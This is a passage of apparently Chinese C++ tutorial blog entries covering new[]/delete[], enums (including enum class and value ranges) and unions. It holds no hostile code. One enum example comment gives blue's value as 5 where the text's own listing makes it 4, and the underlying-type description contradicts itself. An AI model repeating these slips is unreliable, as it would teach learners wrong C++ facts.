class="comment">// 对 nullptr 调用 delete 是安全的</span></span><br><span class="line">    <span class="keyword">delete</span> p_value; <span class="comment">// 无效果</span></span><br><span class="line">    <span class="keyword">delete</span> p_temp; <span class="comment">// 无效果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误示例:</span></span><br><span class="line">    <span class="keyword">int</span> stack_var = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_stack = &amp;stack_var;</span><br><span class="line">    <span class="comment">// delete p_stack; // 严重错误! 不能 delete 栈内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> * p1 = <span class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line">    <span class="keyword">int</span> * p2 = p1; <span class="comment">// p1 和 p2 指向同一块内存</span></span><br><span class="line">    <span class="keyword">delete</span> p1;</span><br><span class="line">    <span class="comment">// delete p2; // 严重错误! 删除了同一块内存两次</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>忘记 <code>delete</code> 会导致内存泄漏，而错误地使用 <code>delete</code> 则可能导致程序崩溃或数据损坏。正确管理动态内存是 C++ 编程中的一项重要技能。</p><h2 id="4-7-6-使用new来创建动态数组"><a href="#4-7-6-使用new来创建动态数组" class="headerlink" title="4.7.6 使用new来创建动态数组"></a>4.7.6 使用new来创建动态数组</h2><p>除了分配单个变量的内存，<code>new</code> 也可以用来动态分配<strong>数组</strong>。这在你需要在运行时确定数组大小时非常有用。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pointerVariable = <span class="keyword">new</span> typeName [numberOfElements];</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName [numberOfElements];</span><br></pre></td></tr></table></figure><ul><li>  <code>new</code>: 运算符。</li><li>  <code>typeName</code>: 数组元素的数据类型。</li><li>  <code>numberOfElements</code>: 数组的大小，可以是一个变量或表达式，在运行时计算其值。</li><li>  <code>[]</code>: 表明要分配的是一个数组。</li></ul><p><code>new[]</code> 会分配一块连续的内存，足以容纳 <code>numberOfElements</code> 个 <code>typeName</code> 类型的元素，并返回指向<strong>数组第一个元素</strong>的指针。</p><p><strong>释放动态数组 (<code>delete[]</code>):</strong></p><p>释放由 <code>new[]</code> 分配的数组内存<strong>必须</strong>使用 <code>delete[]</code> 运算符，而不是 <code>delete</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [] pointerVariable;</span><br></pre></td></tr></table></figure><ul><li>  <code>delete[]</code>: 用于释放数组内存的运算符。</li><li>  <code>pointerVariable</code>: 指向由 <code>new[]</code> 分配的数组内存的指针。</li></ul><p><strong><code>delete[]</code> 和 <code>delete</code> 的区别至关重要:</strong></p><ul><li>  <code>delete[]</code> 知道需要释放的是一个数组，它会正确地调用数组中每个对象（如果是类类型）的析构函数（如果需要），并释放整个数组占用的内存。</li><li>  如果对 <code>new[]</code> 分配的内存使用 <code>delete</code>（没有 <code>[]</code>），行为是<strong>未定义的</strong>。对于基本类型可能看似正常工作（但仍是错误的），但对于包含对象的数组，很可能只调用第一个对象的析构函数，并可能导致内存损坏或泄漏。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the size of the dynamic array: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid size.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 使用 new[] 分配动态数组</span></span><br><span class="line">    <span class="keyword">int</span> * dynArray = <span class="keyword">new</span> <span class="keyword">int</span>[size]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查分配是否成功 (可选，对于普通 new[] 失败会抛异常)</span></span><br><span class="line">    <span class="keyword">if</span> (dynArray == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory allocation failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 像普通数组一样使用指针访问动态数组元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        dynArray[i] = i * <span class="number">10</span>; <span class="comment">// 使用数组下标访问</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic array elements:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; dynArray[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; *(dynArray + i) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 也可以使用指针算术访问</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 使用 delete[] 释放动态数组内存</span></span><br><span class="line">    <span class="keyword">delete</span> [] dynArray;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将指针设为 nullptr (好习惯)</span></span><br><span class="line">    dynArray = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic array deleted.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误示例:</span></span><br><span class="line">    <span class="keyword">double</span> * p_arr = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">// delete p_arr; // 错误! 应该使用 delete [] p_arr;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  使用 <code>new typeName[size]</code> 分配动态数组。</li><li>  使用 <code>delete [] pointerVariable</code> 释放动态数组。</li><li>  <strong>必须</strong>匹配 <code>new[]</code> 和 <code>delete[]</code>，否则行为未定义。</li><li>  动态数组提供了在运行时确定数组大小的灵活性，但需要程序员负责内存管理。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.6 枚举</title>
      <link href="2025/04/26/4.6_%E6%9E%9A%E4%B8%BE/"/>
      <url>2025/04/26/4.6_%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<p>C++ 的 <code>enum</code> 工具提供了一种创建<strong>符号常量 (Symbolic Constant)</strong> 的方式，常用于定义一组相关的、具有名称的整数常量。这比使用 <code>const int</code> 或 <code>#define</code> 来定义一组相关常量更方便、更具可读性。</p><p><strong>基本概念:</strong></p><ul><li>  <strong>枚举类型 (Enumeration Type):</strong> <code>enum</code> 关键字用于创建一个新的用户定义的整数类型。</li><li>  <strong>枚举量 (Enumerator):</strong> 在枚举类型定义中列出的标识符。它们是具名的常量，代表整数值。</li></ul><p><strong>定义枚举:</strong></p><p>使用 <code>enum</code> 关键字，后跟枚举类型的名称，然后在花括号 <code>&#123;&#125;</code> 内列出枚举量，用逗号分隔。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">spectrum</span> &#123;</span>red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;</span><br></pre></td></tr></table></figure><p><strong>工作原理:</strong></p><ol><li> <strong>创建新类型:</strong> 上述语句创建了一个名为 <code>spectrum</code> 的新类型。</li><li> <strong>定义枚举量:</strong> <code>red</code>, <code>orange</code>, <code>yellow</code> 等成为 <code>spectrum</code> 类型的符号常量。</li><li><strong>自动赋值:</strong> 默认情况下，编译器将整数值赋给枚举量，从 0 开始，依次递增 1。<ul><li>  <code>red</code> 值为 0</li><li>  <code>orange</code> 值为 1</li><li>  <code>yellow</code> 值为 2</li><li>  …</li><li>  <code>ultraviolet</code> 值为 7</li></ul></li></ol><p><strong>声明和使用枚举变量:</strong></p><p>可以像使用其他类型一样声明枚举类型的变量。枚举变量通常只能被赋予该枚举类型中定义的枚举量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">spectrum</span> &#123;</span>red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    spectrum band; <span class="comment">// 声明一个 spectrum 类型的变量 band</span></span><br><span class="line"></span><br><span class="line">    band = blue; <span class="comment">// 将枚举量 blue 赋给 band (合法)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current band (enum value): &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 blue 对应的整数值 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// band = 2000; // 错误! 不能直接将整数赋给枚举变量 (类型不匹配)</span></span><br><span class="line">    <span class="comment">// band = red + orange; // 错误! + 运算符未对枚举类型定义 (虽然 red 和 orange 有整数值)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以将枚举量赋给 int 变量 (枚举量会自动提升为 int)</span></span><br><span class="line">    <span class="keyword">int</span> colorCode = green; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Color code for green: &quot;</span> &lt;&lt; colorCode &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以强制将 int 转换为枚举类型 (需要显式转换，且需谨慎)</span></span><br><span class="line">    band = <span class="keyword">static_cast</span>&lt;spectrum&gt;(<span class="number">3</span>); <span class="comment">// 将 3 转换为 spectrum 类型 (对应 green)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Band after cast: &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="keyword">if</span> (band == green) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The band is green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在循环中使用 (需要注意类型转换和范围)</span></span><br><span class="line">    <span class="keyword">for</span> (band = red; band &lt;= ultraviolet; band = <span class="keyword">static_cast</span>&lt;spectrum&gt;(band + <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing band: &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>枚举的优点:</strong></p><ul><li>  <strong>提高可读性:</strong> 使用有意义的名称（如 <code>red</code>, <code>blue</code>）代替神秘的数字（0, 4）。</li><li>  <strong>类型安全:</strong> 枚举创建了新的类型，有助于防止将不相关的整数值赋给枚举变量（虽然可以通过强制转换绕过）。</li><li>  <strong>代码维护:</strong> 如果需要更改某个常量的值或添加新常量，只需修改枚举定义。</li></ul><h2 id="4-6-1-设置枚举量的值"><a href="#4-6-1-设置枚举量的值" class="headerlink" title="4.6.1 设置枚举量的值"></a>4.6.1 设置枚举量的值</h2><p>可以显式地为枚举量指定整数值。</p><p><strong>规则:</strong></p><ul><li>  使用赋值运算符 <code>=</code> 为枚举量指定值。</li><li>  未被显式赋值的枚举量的值将基于<strong>前一个</strong>枚举量的值加 1。</li><li>  第一个枚举量如果未显式赋值，默认为 0。</li><li>  不同的枚举量可以具有相同的值。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">BitField</span> &#123;</span></span><br><span class="line">    BIT_ZERO,       <span class="comment">// 默认值为 0</span></span><br><span class="line">    BIT_ONE,        <span class="comment">// 默认值为 1</span></span><br><span class="line">    BIT_TWO = <span class="number">4</span>,    <span class="comment">// 显式赋值为 4</span></span><br><span class="line">    BIT_THREE,      <span class="comment">// 值为 BIT_TWO + 1 = 5</span></span><br><span class="line">    BIT_FOUR = <span class="number">8</span>,   <span class="comment">// 显式赋值为 8</span></span><br><span class="line">    BIT_FIVE = <span class="number">8</span>,   <span class="comment">// 显式赋值为 8 (与 BIT_FOUR 相同)</span></span><br><span class="line">    BIT_SIX,        <span class="comment">// 值为 BIT_FIVE + 1 = 9</span></span><br><span class="line">    BIT_SEVEN = BIT_THREE + BIT_FOUR <span class="comment">// 值为 5 + 8 = 13</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_ZERO: &quot;</span> &lt;&lt; BIT_ZERO &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_ONE: &quot;</span> &lt;&lt; BIT_ONE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_TWO: &quot;</span> &lt;&lt; BIT_TWO &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_THREE: &quot;</span> &lt;&lt; BIT_THREE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_FOUR: &quot;</span> &lt;&lt; BIT_FOUR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_FIVE: &quot;</span> &lt;&lt; BIT_FIVE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_SIX: &quot;</span> &lt;&lt; BIT_SIX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 9</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_SEVEN: &quot;</span> &lt;&lt; BIT_SEVEN &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 13</span></span><br><span class="line"></span><br><span class="line">    BitField flags = BIT_THREE;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Flags: &quot;</span> &lt;&lt; flags &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-6-2-枚举的取值范围"><a href="#4-6-2-枚举的取值范围" class="headerlink" title="4.6.2 枚举的取值范围"></a>4.6.2 枚举的取值范围</h2><p>虽然枚举量是 <code>int</code> 类型的常量，但枚举类型本身 (<code>spectrum</code>, <code>BitField</code> 等) 的取值范围并不一定等同于 <code>int</code>。</p><p><strong>C++98/03 标准:</strong></p><ul><li>  <strong>底层类型 (Underlying Type):</strong> 编译器会选择一种能够容纳所有枚举量值的<strong>整型</strong>作为该枚举的底层类型。这个类型至少要和 <code>int</code> 一样大，但如果所有枚举量的值可以用更小的类型（如 <code>char</code> 或 <code>short</code>）表示，编译器<strong>可能</strong>会选择更小的类型来节省内存。</li><li><strong>取值范围:</strong> 枚举变量理论上可以存储的值的范围由其底层类型决定。然而，C++ 标准对枚举变量可以<strong>合法持有</strong>的值有更严格的规定。一个枚举变量可以持有的值，其上限是大于最大枚举量值的最小的 2 的幂减 1，下限类似（如果存在负枚举量值，则为小于最小枚举量值的最大的 2 的幂加 1；如果枚举量都非负，则下限为 0）。<ul><li>  例如，对于 <code>enum spectrum &#123;red=0, ..., ultraviolet=7&#125;</code>，最大枚举量是 7。大于 7 的最小的 2 的幂是 8，所以上限是 8 - 1 = 7。下限是 0。因此，<code>spectrum</code> 变量理论上可以持有 0 到 7 范围内的值。</li><li>  对于 <code>enum BitField &#123;..., BIT_SEVEN=13&#125;</code>，最大枚举量是 13。大于 13 的最小的 2 的幂是 16，上限是 16 - 1 = 15。下限是 0。<code>BitField</code> 变量理论上可以持有 0 到 15 范围内的值。</li></ul></li><li>  <strong>赋值限制:</strong> 尽管范围可能比枚举量的值域宽，但 C++ 通常不允许直接将超出枚举量定义范围的整数值赋给枚举变量（即使该整数在理论范围内），需要显式类型转换。</li></ul><p><strong>C++11 作用域内枚举 (Scoped Enumeration):</strong></p><p>C++11 引入了 <code>enum class</code> (或 <code>enum struct</code>)，称为<strong>作用域内枚举</strong>，提供了更强的类型安全和作用域控制：</p><ul><li>  <strong>强类型:</strong> <code>enum class</code> 的枚举量不会隐式转换为整数。</li><li>  <strong>作用域:</strong> 枚举量的名称被限制在枚举类型的作用域内，访问时需要使用 <code>EnumType::Enumerator</code>。</li><li>  <strong>可指定底层类型:</strong> 可以显式指定底层整数类型，例如 <code>enum class Color : unsigned char &#123; Red, Green, Blue &#125;;</code>。</li><li>  <strong>无隐式转换:</strong> 不能将整数直接赋给 <code>enum class</code> 变量，也不能将 <code>enum class</code> 变量隐式转换为整数，都需要显式转换 (<code>static_cast</code>)。</li></ul><p><strong>用法与示例 (范围和 C++11):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OldEnum</span> &#123;</span> A = <span class="number">1</span>, B = <span class="number">2</span>, C = <span class="number">4</span> &#125;; <span class="comment">// 最大值 4, 范围可能是 0-7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 作用域内枚举</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">NewEnum</span> &#123;</span> X = <span class="number">10</span>, Y = <span class="number">20</span>, Z = <span class="number">30</span> &#125;; </span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Status</span> :</span> <span class="keyword">char</span> &#123; OK = <span class="string">&#x27;O&#x27;</span>, Error = <span class="string">&#x27;E&#x27;</span>, Pending = <span class="string">&#x27;P&#x27;</span> &#125;; <span class="comment">// 指定底层类型为 char</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    OldEnum oe;</span><br><span class="line">    <span class="comment">// oe = 7; // 编译错误 (通常不允许直接赋 int)</span></span><br><span class="line">    oe = <span class="keyword">static_cast</span>&lt;OldEnum&gt;(<span class="number">7</span>); <span class="comment">// 合法 (因为 7 在理论范围 0-7 内)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;OldEnum value: &quot;</span> &lt;&lt; oe &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// oe = static_cast&lt;OldEnum&gt;(8); // 行为未定义或可能编译错误 (超出理论范围)</span></span><br><span class="line"></span><br><span class="line">    NewEnum ne = NewEnum::Y; <span class="comment">// 必须使用作用域解析符</span></span><br><span class="line">    <span class="comment">// int ne_val = ne; // 错误! 不能隐式转换为 int</span></span><br><span class="line">    <span class="keyword">int</span> ne_val = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(ne); <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NewEnum value as int: &quot;</span> &lt;&lt; ne_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ne = 20; // 错误! 不能将 int 赋给 enum class</span></span><br><span class="line">    ne = <span class="keyword">static_cast</span>&lt;NewEnum&gt;(<span class="number">10</span>); <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NewEnum value after cast: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(ne) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line"></span><br><span class="line">    Status s = Status::OK;</span><br><span class="line">    <span class="keyword">char</span> s_char = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(s); <span class="comment">// 转换为底层类型 char</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Status as char: &quot;</span> &lt;&lt; s_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 O</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong><br>传统的 <code>enum</code> 提供了一种创建命名常量的方式，但类型安全较弱，且枚举量会污染所在的作用域。C++11 的 <code>enum class</code> 提供了更强的类型安全和作用域控制，是现代 C++ 中更推荐的选择。在使用传统 <code>enum</code> 时，要注意其取值范围和与整数类型转换的规则。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.5 共用体</title>
      <link href="2025/04/26/4.5_%E5%85%B1%E7%94%A8%E4%BD%93/"/>
      <url>2025/04/26/4.5_%E5%85%B1%E7%94%A8%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<p><strong>共用体 (Union)</strong> 是一种特殊的数据结构，它也允许在一个结构中存储不同的数据类型，但与结构体 (struct) 不同的是，共用体的<strong>所有成员共享同一块内存空间</strong>。</p><p><strong>核心特点:</strong></p><ul><li>  <strong>内存共享:</strong> 共用体的大小由其<strong>最大</strong>的成员的大小决定。所有成员都从相同的内存地址开始存储。</li><li>  <strong>同一时间只有一个成员有效:</strong> 在任何时刻，你只能有效地存储和使用共用体中的<strong>一个</strong>成员的值。当你给一个成员赋值时，可能会覆盖掉其他成员的数据。</li><li>  <strong>节省内存:</strong> 当你需要存储多种类型的数据，但知道在任何时候只需要用到其中一种时，共用体可以节省内存，因为它只需要分配足够容纳最大成员的空间。</li></ul><p><strong>定义共用体:</strong></p><p>使用 <code>union</code> 关键字定义，语法与 <code>struct</code> 类似。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">UnionName</span> &#123;</span></span><br><span class="line">    memberType1 memberName1;</span><br><span class="line">    memberType2 memberName2;</span><br><span class="line">    <span class="comment">// ... more members</span></span><br><span class="line">&#125;; <span class="comment">// 注意定义末尾的分号</span></span><br></pre></td></tr></table></figure><p><strong>访问成员:</strong></p><p>与结构体一样，使用<strong>成员运算符</strong>（点运算符 <code>.</code>) 来访问共用体变量的成员。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 